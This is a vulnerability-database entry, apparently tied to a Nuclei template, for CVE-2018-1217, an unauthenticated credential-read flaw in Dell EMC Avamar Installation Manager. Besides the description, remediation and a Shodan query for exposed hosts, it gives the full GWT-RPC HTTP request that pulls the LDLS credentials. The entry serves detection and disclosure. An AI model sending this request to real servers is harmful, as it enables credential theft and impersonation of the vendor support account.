---
layout: "post"
cve_id: "CVE-2018-1217"
title: "Dell EMC Avamar and Integrated Data Protection Appliance Installation Manager - Invalid Access Control"
pcap: true
pcap_path: "/pcaps/2018/CVE-2018-1217.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-1217.yaml"
author: "daffainfo"
severity: "critical"
impact: "Unauthenticated attackers can read or modify Local Download Service credentials, impersonate the service when accessing Dell EMC Online Support, or prevent legitimate connections by corrupting the configuration.
"
remediation: "Upgrade to a patched version of Dell EMC Avamar or apply vendor-provided security updates.
"
reference:
  - "https://www.exploit-db.com/exploits/44441"
  - "https://nvd.nist.gov/vuln/detail/CVE-2018-1217"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2018-1217', 'epss-score': 0.65914, 'epss-percentile': 0.98445, 'cwe-id': 'CWE-862', 'cpe': 'cpe:2.3:a:dell:emc_avamar:*:*:*:*:*:*:*:*, cpe:2.3:a:dell:emc_integrated_data_protection_appliance:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'dell', 'product': 'emc_avamar,emc_integrated_data_protection_appliance', 'shodan-query': 'title:"AVAMAR"'}"
tags:
  - "cve"
  - "cve2018"
  - "dell"
  - "avamar"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Avamar Installation Manager in Dell EMC Avamar Server 7.3.1, 7.4.1, and 7.5.0, and Dell EMC Integrated Data Protection Appliance 2.0 and 2.1, is affected by a missing access control check vulnerability which could potentially allow a remote unauthenticated attacker to read or change the Local Download Service (LDLS) credentials. The LDLS credentials are used to connect to Dell EMC Online Support. If the LDLS configuration was changed to an invalid configuration, then Avamar Installation Manager may not be able to connect to Dell EMC Online Support web site successfully. The remote unauthenticated attacker can also read and use the credentials to login to Dell EMC Online Support, impersonating the AVI service actions using those credentials.


## üåê HTTP Request
```nohighlight
POST /avi/avigui/avigwt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Content-Length: 202
Content-Type: text/x-gwt-rpc; charset=UTF-8
X-Gwt-Module-Base: https://www.victim.com/avi/avigui/
X-Gwt-Permutation: 38CB2E1WSQy4b1FdYLfkVUdmUgh
Accept-Encoding: gzip

7|0|6|https://www.victim.com/avi/avigui/|60AF6BC6976F9B1F05AC454813F5324D|com.avamar.avinstaller.gwt.shared.AvinstallerService|getLDLSConfig|java.lang.String/2004016611|www.victim.com|1|2|3|4|2|5|5|6|0|
```

